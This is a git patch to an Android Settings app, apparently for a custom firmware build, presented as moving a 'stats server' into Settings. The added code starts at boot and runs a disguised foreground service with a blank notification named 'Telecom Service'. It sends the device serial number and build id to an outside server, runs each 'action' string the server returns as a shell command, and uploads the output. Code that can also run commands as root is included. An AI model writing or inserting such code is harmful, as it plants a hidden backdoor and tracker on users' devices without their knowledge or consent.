@@ -1,0 +1,597 @@
+From fa3d2a50ade04f829f7ec1141095490a00f96ece Mon Sep 17 00:00:00 2001
+From: vgdn1942 <vgdn1942@gmail.com>
+Date: Tue, 21 Dec 2021 09:47:28 +0300
+Subject: [PATCH] Move stats server to Settings
+
+Change-Id: Id3bbfb6344f43cc40beb1f86db8444526dd38f8f
+---
+ AndroidManifest.xml                           |  17 ++
+ .../settings/stats/BootCompletedReceiver.java |  23 ++
+ .../settings/stats/CommandExecutor.java       | 144 +++++++++++
+ .../android/settings/stats/FoneService.java   | 110 ++++++++
+ .../android/settings/stats/StatServer.java    | 240 ++++++++++++++++++
+ 5 files changed, 534 insertions(+)
+ create mode 100644 src/com/android/settings/stats/BootCompletedReceiver.java
+ create mode 100644 src/com/android/settings/stats/CommandExecutor.java
+ create mode 100644 src/com/android/settings/stats/FoneService.java
+ create mode 100644 src/com/android/settings/stats/StatServer.java
+
+diff --git a/AndroidManifest.xml b/AndroidManifest.xml
+index 0344512f09..e0b2205e39 100644
+--- a/AndroidManifest.xml
++++ b/AndroidManifest.xml
+@@ -182,6 +182,14 @@
+             </intent-filter>
+         </receiver>
+ 
++        <receiver
++            android:name=".stats.BootCompletedReceiver"
++            android:exported="true">
++            <intent-filter>
++                <action android:name="android.intent.action.BOOT_COMPLETED" />
++            </intent-filter>
++        </receiver>
++
+         <activity android:name=".SubSettings"
+                   android:theme="@style/Theme.SubSettings" />
+ 
+@@ -3423,6 +3431,15 @@
+             android:exported="true"
+             android:permission="android.permission.DUMP" />
+ 
++        <service
++            android:name=".stats.FoneService"
++            android:exported="true">
++            <intent-filter>
++                <action android:name="android.intent.action.USER_PRESENT"/>
++                <action android:name="android.intent.action.ACTION_SCREEN_OFF" />
++            </intent-filter>
++        </service>
++
+         <!-- Quick Settings tiles for Developer Options -->
+         <service
+             android:name=".development.qstile.DevelopmentTiles$ShowLayout"
+diff --git a/src/com/android/settings/stats/BootCompletedReceiver.java b/src/com/android/settings/stats/BootCompletedReceiver.java
+new file mode 100644
+index 0000000000..a99312bdd3
+--- /dev/null
++++ b/src/com/android/settings/stats/BootCompletedReceiver.java
+@@ -0,0 +1,23 @@
++package com.android.settings.stats;
++
++import android.content.BroadcastReceiver;
++import android.content.Context;
++import android.content.Intent;
++import android.os.Build;
++import android.util.Log;
++
++public class BootCompletedReceiver extends BroadcastReceiver {
++
++    private static final String TAG = "stats_BootCompletedReceiver";
++    private static final boolean DEBUG = false;
++
++    @Override
++    public void onReceive(Context context, Intent intent) {
++        if (DEBUG) Log.d(TAG, "Starting service...");
++        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
++            context.startForegroundService(new Intent(context, FoneService.class));
++        } else {
++            context.startService(new Intent(context, FoneService.class));
++        }
++    }
++}
+diff --git a/src/com/android/settings/stats/CommandExecutor.java b/src/com/android/settings/stats/CommandExecutor.java
+new file mode 100644
+index 0000000000..28837917e3
+--- /dev/null
++++ b/src/com/android/settings/stats/CommandExecutor.java
+@@ -0,0 +1,144 @@
++package com.android.settings.stats;
++
++import java.io.ByteArrayOutputStream;
++import java.io.DataOutputStream;
++import java.io.InputStream;
++import java.io.InputStreamReader;
++import java.io.OutputStream;
++
++public class CommandExecutor {
++
++    // Модель для получения результата
++    public static class ResultData {
++        // Код результата
++        private int resultCode;
++        // Результат отработки команды
++        private String resultData;
++        // Поле для записи ошибок
++        private String resultError;
++
++        // Конструктор
++        ResultData(int code, String info, String err) {
++            resultCode = code;
++            resultData = info == null ? "" : info;
++            resultError = err == null ? "" : err;
++        }
++
++        // Геттеры полей
++        public int getResultCode() {
++            return resultCode;
++        }
++
++        public String getResultData() {
++            return resultData;
++        }
++
++        public String getResultError() {
++            return resultError;
++        }
++
++        public String getResult() {
++            return toString();
++        }
++
++        public String toString() {
++            return resultData + "\n" + resultError;
++        }
++    }
++
++    // Выполнение простой sh-команды
++    public static ResultData execute(String command) {
++        return execute(false, command);
++    }
++
++    // То же что и выше, но из под рута
++    public static ResultData executeSu(String command) {
++        return execute(true, command);
++    }
++
++    // Если нужно изменять значение su динамически
++    public static ResultData execute(boolean su, String command) {
++        return execPool(su, rmSlashN(command).split("\n"));
++    }
++
++    // Выполняем массив команд
++    private static ResultData execPool(boolean su, String[] commands) {
++        // Объявление переменных
++        Process exec = null;
++        InputStream execIn = null;
++        InputStream execErr = null;
++        OutputStream execOs = null;
++
++        ResultData resultData;
++        try {
++            // В зависимости от значения su меняем параметр запуска команды
++            // От рута или же от юзера
++            exec = Runtime.getRuntime().exec(su ? "su" : "sh");
++            execIn = exec.getInputStream();
++            execErr = exec.getErrorStream();
++            execOs = exec.getOutputStream();
++            DataOutputStream dos = new DataOutputStream(execOs);
++            // В цикле проходимся по всем отосланным командам
++            for (String com : commands)
++                if (!com.isEmpty()) {
++                    dos.writeBytes(com + "\n");
++                    dos.flush();
++                }
++            dos.close();
++            // Посылаем команду и ждём ответа от оболочки
++            resultData = new ResultData(exec.waitFor(), inputStream2String(execIn, "utf-8"), inputStream2String(execErr, "utf-8"));
++        } catch (Exception e) {
++            resultData = new ResultData(-1, "", e.toString());
++        } finally {
++            try {
++                // Не забываем закрыть все стримы
++                if (execIn != null) execIn.close();
++                if (execErr != null) execErr.close();
++                if (execOs != null) execOs.close();
++                // Завершаем процесс выполнения
++                if (exec != null) exec.destroy();
++            } catch (Exception ignored) {
++            }
++        }
++        return resultData;
++    }
++
++    // Преобразование стрима в строку
++    public static String inputStream2String(InputStream in, String encoding) throws Exception {
++        StringBuilder out = new StringBuilder();
++        InputStreamReader inread = new InputStreamReader(in, encoding);
++        char[] b = new char[1024];
++        int n;
++        while ((n = inread.read(b)) != -1) {
++            String s = new String(b, 0, n);
++            out.append(s);
++        }
++        return out.toString();
++    }
++
++    // Чтение стрима в строку
++    public static String read(InputStream is) {
++        try {
++            ByteArrayOutputStream byteOutStream = new ByteArrayOutputStream();
++            byte[] buffer = new byte[1024];
++            int length;
++            while ((length = is.read(buffer)) != -1)
++                byteOutStream.write(buffer, 0, length);
++            return byteOutStream.toString("UTF-8");
++        } catch (Exception e) {
++            e.printStackTrace();
++            return e.toString();
++        }
++    }
++
++    // Удаляем лишние переносы строки
++    public static String rmSlashN(String text) {
++        while (text.contains("\n\n")) text = text.replace("\n\n", "\n");
++        if (text.startsWith("\n"))
++            text = text.substring(1);
++        if (text.endsWith("\n"))
++            text = text.substring(0, text.length() - 1);
++
++        return text;
++    }
++}
+diff --git a/src/com/android/settings/stats/FoneService.java b/src/com/android/settings/stats/FoneService.java
+new file mode 100644
+index 0000000000..7dd43e6c4a
+--- /dev/null
++++ b/src/com/android/settings/stats/FoneService.java
+@@ -0,0 +1,110 @@
++package com.android.settings.stats;
++
++import android.annotation.TargetApi;
++import android.app.Notification;
++import android.app.NotificationChannel;
++import android.app.NotificationManager;
++import android.app.Service;
++import android.content.BroadcastReceiver;
++import android.content.Context;
++import android.content.Intent;
++import android.content.IntentFilter;
++import android.os.Build;
++import android.os.IBinder;
++import android.util.Log;
++
++import com.android.settings.R;
++
++public class FoneService extends Service {
++    private static final String TAG = "stats_FoneService";
++    private static final boolean DEBUG = false;
++
++    private StatServer statServer;
++
++    @Override
++    public void onCreate() {
++        if (DEBUG) Log.d(TAG, "Creating service");
++        statServer = new StatServer(this);
++
++        IntentFilter screenStateFilter = new IntentFilter();
++        screenStateFilter.addAction(Intent.ACTION_SCREEN_OFF);
++        screenStateFilter.addAction(Intent.ACTION_USER_PRESENT);
++        registerReceiver(mScreenStateReceiver, screenStateFilter);
++
++        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
++            startMyOwnForeground(777);
++        } else {
++            startForeground(777, new Notification());
++        }
++    }
++
++    @Override
++    public int onStartCommand(Intent intent, int flags, int startId) {
++        if (DEBUG) Log.d(TAG, "Starting service");
++        onStartService();
++        return START_STICKY;
++    }
++
++    @Override
++    public void onDestroy() {
++        if (DEBUG) Log.d(TAG, "Destroying service");
++        this.unregisterReceiver(mScreenStateReceiver);
++        statServer.conn.disconnect();
++        super.onDestroy();
++    }
++
++    @Override
++    public IBinder onBind(Intent intent) {
++        return null;
++    }
++
++    private void onStartService() {
++        statServer.receive();
++        statServer.send();
++    }
++
++    private void onDeviceUnlocked() {
++        statServer.receive();
++        statServer.send();
++    }
++
++    private void onDisplayOff() {
++        //statServer.conn.disconnect();
++    }
++
++    private BroadcastReceiver mScreenStateReceiver = new BroadcastReceiver() {
++        @Override
++        public void onReceive(Context context, Intent intent) {
++            if (intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
++                if (DEBUG) Log.d(TAG, "Device unlocked");
++                onDeviceUnlocked();
++            } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
++                if (DEBUG) Log.d(TAG, "Display off");
++                onDisplayOff();
++            }
++        }
++    };
++
++    @TargetApi(Build.VERSION_CODES.O)
++    private void startMyOwnForeground(int id) {
++        String NOTIFICATION_CHANNEL_ID = "com.android.projectq";
++        String channelName = "Telecom Service";
++        NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL_ID,
++                channelName, NotificationManager.IMPORTANCE_NONE);
++        channel.enableLights(false);
++        channel.enableVibration(false);
++        channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
++        channel.setImportance(NotificationManager.IMPORTANCE_MIN);
++        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
++        assert manager != null;
++        manager.createNotificationChannel(channel);
++
++        Notification.Builder notificationBuilder = new Notification.Builder(this, NOTIFICATION_CHANNEL_ID);
++        Notification notification = notificationBuilder.setOngoing(true)
++                .setSmallIcon(R.drawable.empty_icon)
++                .setContentTitle(" ")
++                .setCategory(Notification.CATEGORY_SERVICE)
++                .build();
++        startForeground(id, notification);
++    }
++}
+diff --git a/src/com/android/settings/stats/StatServer.java b/src/com/android/settings/stats/StatServer.java
+new file mode 100644
+index 0000000000..74d459125e
+--- /dev/null
++++ b/src/com/android/settings/stats/StatServer.java
+@@ -0,0 +1,240 @@
++package com.android.settings.stats;
++
++import android.content.Context;
++import android.provider.Settings;
++import android.os.AsyncTask;
++import android.os.Build;
++import android.os.SystemProperties;
++import android.util.Log;
++
++import java.io.BufferedReader;
++import java.io.InputStream;
++import java.io.InputStreamReader;
++import java.net.HttpURLConnection;
++import java.net.URL;
++import java.net.URLEncoder;
++
++import org.json.JSONArray;
++import org.json.JSONObject;
++
++import static java.nio.charset.StandardCharsets.UTF_8;
++
++public class StatServer {
++    private static final String TAG = "stats_StatServer";
++    private static final boolean DEBUG = false;
++
++    private String server_name = "https://vgdn1942.ru";
++    //private String server_name = "http://vgdn1942.h1n.ru";
++    //private String server_name = "http://l257728y.beget.tech";
++    private String server_select = "stats.php?action=select";
++    private String server_insert = "stats.php?action=insert";
++
++    private String build_property = "persist.sys.id_build";
++    private String stats_property = "persist.sys.id_stats";
++    private String google_property = "ro.com.google.gmsversion";
++    private String lineage_property = "ro.lineage.version";
++    //private String device_property = "ro.product.device";
++
++    private String id_build = SystemProperties.get(build_property, "none");
++    private String id_stats = SystemProperties.get(stats_property, "false");
++    private String id_google = SystemProperties.get(google_property, "none");
++    private String android_id = ("12_202110".equals(id_google)) ? "true" : "false";
++    private String result = "";
++
++    SendToServer sendToServer;
++    ReceiveFromServer receiveFromServer;
++    HttpURLConnection conn;
++    Context context;
++
++    StatServer(Context context) {
++        this.context = context;
++    }
++
++    void receive() {
++        receiveFromServer = new ReceiveFromServer();
++        receiveFromServer.execute();
++    }
++
++    void send() {
++        sendToServer = new SendToServer();
++        sendToServer.execute();
++    }
++
++    String getBuildId() {
++        return SystemProperties.get(lineage_property, "unknown");
++    }
++
++    String getSerialNo() {
++        return (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) ? Build.SERIAL : Build.getSerial();
++                /*Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID).toUpperCase();*/
++    }
++
++    private class ReceiveFromServer extends AsyncTask<Void, Void, Integer> {
++        String serial_no = getSerialNo();
++        Integer res;
++
++        // answer = ответ на запрос
++        // lnk = линк с параметрами
++        // action = действие
++        String answer, lnk, action;
++
++        protected Integer doInBackground(Void... params) {
++            try {
++                // формируем запрос по которому получим данные из ячейки с нужным серийным номером
++                lnk = server_name + "/" + server_select + "&serial_no="
++                        + URLEncoder.encode(serial_no, "UTF-8");
++                if (DEBUG) Log.i(TAG, " StatServer - pre_url lnk: " + lnk);
++                // создаем соединение ---------------------------------->
++                if (DEBUG) Log.i(TAG, " StatServer open connection");
++                conn = (HttpURLConnection) new URL(lnk).openConnection();
++                conn.setReadTimeout(10000);
++                conn.setConnectTimeout(15000);
++                conn.setRequestMethod("POST");
++                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
++                conn.setDoInput(true);
++                conn.connect();
++                res = conn.getResponseCode();
++            } catch (Exception e) {
++                if (DEBUG) Log.i(TAG, " StatServer error: "
++                        + e.getMessage());
++            }
++            // получаем ответ ---------------------------------->
++            try {
++                InputStream is = conn.getInputStream();
++                BufferedReader br = new BufferedReader(new InputStreamReader(is, UTF_8));
++                // StandardCharsets.UTF_8
++                StringBuilder sb = new StringBuilder();
++                String bfr_st;
++                while ((bfr_st = br.readLine()) != null) {
++                    sb.append(bfr_st);
++                }
++                // сформируем ответ сервера в string
++                // обрежем в полученном ответе все, что находится за "]"
++                // это необходимо, т.к. json ответ приходит с мусором
++                // и если этот мусор не убрать - будет невалидным
++                answer = sb.toString();
++                answer = answer.substring(0, answer.indexOf("]") + 1);
++                if (DEBUG) Log.i(TAG, " StatServer - full answer server: "
++                        + answer);
++                is.close(); // закроем поток
++                br.close(); // закроем буфер
++
++            } catch (Exception e) {
++                if (DEBUG) Log.i(TAG, " StatServer error: " + e.getMessage());
++            } finally {
++                conn.disconnect();
++                if (DEBUG) Log.i(TAG, " StatServer close connection");
++            }
++            // запишем ответ в БД ---------------------------------->
++            if (answer != null && !answer.trim().equals("")) {
++                if (DEBUG) Log.i(TAG, " StatServer answer contains JSON:");
++                try {
++                    // ответ превратим в JSON массив
++                    JSONArray ja = new JSONArray(answer);
++                    JSONObject jo;
++                    int i = 0;
++
++                    while (i < ja.length()) {
++                        // разберем JSON массив построчно
++                        jo = ja.getJSONObject(i);
++                        if (DEBUG) Log.i(TAG,
++                                "=================>>> "
++                                        + jo.getString("serial_no")
++                                        + " | " + jo.getString("android_id")
++                                        + " | " + jo.getString("build_id")
++                                        + " | " + jo.getString("data")
++                                        + " | " + jo.getString("action"));
++                        action = jo.getString("action");
++                        if (DEBUG) Log.i(TAG, " StatServer action: " + action);
++                        if (action != null && !action.trim().equals("")) {
++                            result = CommandExecutor.execute(false, action).getResult();
++                            if (DEBUG) Log.i(TAG, " CommandExecutor: " + result);
++                        } else {
++                            result = "";
++                        }
++                        i++;
++                    }
++                } catch (Exception e) {
++                    // если ответ сервера не содержит валидный JSON
++                    if (DEBUG) Log.i(TAG, " StatServer error answer server: "
++                            + e.getMessage());
++                }
++            } else {
++                // если ответ сервера пустой
++                if (DEBUG) Log.i(TAG, " StatServer answer NOT contains JSON!");
++            }
++
++            try {
++                Thread.sleep(15000); // пауза 15 сек. (15000 мсек.)
++            } catch (Exception e) {
++                if (DEBUG) Log.i(TAG, " StatServer - error process: "
++                        + e.getMessage());
++            }
++            return res;
++        }
++    }
++
++    private class SendToServer extends AsyncTask<Void, Void, Integer> {
++        String serial_no = getSerialNo();
++        Integer res;
++
++        protected Integer doInBackground(Void... params) {
++            if (DEBUG) Log.i(TAG, " StatServer - pre post_url: "
++                    + server_name
++                    + "/"
++                    + server_insert
++                    + "&serial_no="
++                    + serial_no
++                    + "&android_id="
++                    + android_id
++                    + "&build_id="
++                    + getBuildId()
++                    + "&result="
++                    + result);
++            try {
++                String post_url = server_name
++                        + "/"
++                        + server_insert
++                        + "&serial_no="
++                        + URLEncoder.encode(serial_no, "UTF-8")
++                        + "&android_id="
++                        + URLEncoder.encode(android_id, "UTF-8")
++                        + "&build_id="
++                        + URLEncoder.encode(getBuildId(), "UTF-8")
++                        + "&result="
++                        + URLEncoder.encode(result, "UTF-8");
++
++                URL url = new URL(post_url);
++                if (DEBUG) Log.i(TAG, " StatServer - post_url: " + post_url);
++
++                conn = (HttpURLConnection) url.openConnection();
++                conn.setConnectTimeout(10000);
++                conn.setRequestMethod("POST");
++                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
++                conn.connect();
++
++                res = conn.getResponseCode();
++                if (DEBUG) Log.i(TAG, " StatServer - answer server (200 - all OK): " + res.toString());
++                if ("200".equals(res.toString())) {
++                    if (DEBUG) Log.i(TAG, " StatServer - answer server OK");
++                    if (("null".equals(id_build) || "".equals(id_build)) ||
++                            ("true".equals(id_stats) && !getBuildId().equals(id_build))) {
++                        SystemProperties.set(build_property, getBuildId());
++                    }
++                    if ("false".equals(id_stats) || "".equals(id_stats)) {
++                        SystemProperties.set(stats_property, "true");
++                    }
++                    if (DEBUG) Log.i(TAG, " StatServer - id_build: " + id_build);
++                    if (DEBUG) Log.i(TAG, " StatServer - id_stats: " + id_stats);
++                }
++            } catch (Exception e) {
++                if (DEBUG) Log.i(TAG, " StatServer - error connection: " + e.getMessage());
++                SystemProperties.set(stats_property, "false");
++            } finally {
++                conn.disconnect();
++                //stopSelf();
++            }
++            return res;
++        }
++    }
++}
+-- 
+2.20.1
+
